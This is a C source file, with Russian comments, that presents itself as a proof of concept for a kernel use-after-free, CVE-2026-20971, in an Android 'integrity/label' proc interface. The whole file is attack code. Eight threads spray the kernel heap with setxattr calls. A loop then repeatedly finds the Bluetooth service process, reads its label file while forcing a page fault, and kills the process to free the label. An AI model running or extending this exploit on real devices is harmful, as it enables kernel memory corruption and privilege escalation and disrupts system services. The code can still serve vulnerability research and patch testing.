#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <sys/wait.h>

// Функция для поиска PID процесса по имени
int find_pid(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    int pid = -1;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int id = atoi(entry->d_name);
            if (id > 0) {
                char path[256], cmdline[256];
                snprintf(path, sizeof(path), "/proc/%d/cmdline", id);
                int fd = open(path, O_RDONLY);
                if (fd >= 0) {
                    int n = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (n > 0) {
                        cmdline[n] = '\0';
                        // Проверяем, совпадает ли начало строки
                        if (strstr(cmdline, name) != NULL) {
                            pid = id;
                            break;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

void* spray_thread(void* arg) {
    char value[64];
    memset(value, 0xFF, sizeof(value)); // Заполняем 0xFF (длина 0xFFFF)
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);

    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        setxattr(path, name, value, sizeof(value), 0);
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 FIVE Label UAF PoC\n");

    // 1. Запускаем потоки спрея (kmalloc-32, 64)
    for (int i=0; i<8; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    // Выделяем память для вызова page fault при чтении
    char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    long iterations = 0;
    while (1) {
        // 2. Находим PID Bluetooth (он перезапускается, поэтому ищем каждый раз)
        int pid = find_pid("com.android.bluetooth");
        if (pid == -1) {
            usleep(10000);
            continue;
        }

        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/integrity/label", pid);

        // 3. Открываем и читаем label (с page fault)
        madvise(buf, 4096, MADV_DONTNEED);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            read(fd, buf, 4096); // Здесь мы уснем
            close(fd);
        }

        // 4. Убиваем процесс, чтобы освободить label
        kill(pid, SIGKILL);
        
        iterations++;
        if (iterations % 10000 == 0) {
            printf("[*] Iterations: %ld\n", iterations);
        }
    }
    return 0;
}